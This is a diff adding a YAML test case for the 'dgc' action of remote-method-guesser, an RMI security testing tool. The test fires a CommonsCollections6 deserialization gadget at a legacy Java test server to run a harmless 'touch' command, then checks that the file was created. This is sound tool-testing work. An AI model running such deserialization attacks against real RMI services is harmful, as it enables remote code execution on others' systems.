@@ -1,0 +1,30 @@
+tester:
+  name: dgc
+  title: DGC Tests
+  description: >
+    "Performs tests on remote-methods-guessers 'dgc' action."
+
+variables:
+  file: dgc-rce-test.txt
+
+tests:
+  - title: Gadget Call
+    description: >
+      'Attempts a deserialization attack on the DGC endpoint.'
+      'This should work, as the server runs a legacy version of Java.'
+
+    command: '${BASE-CMD}'
+    arguments:
+      - dgc
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught ClassCastException
+            - probably successful
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
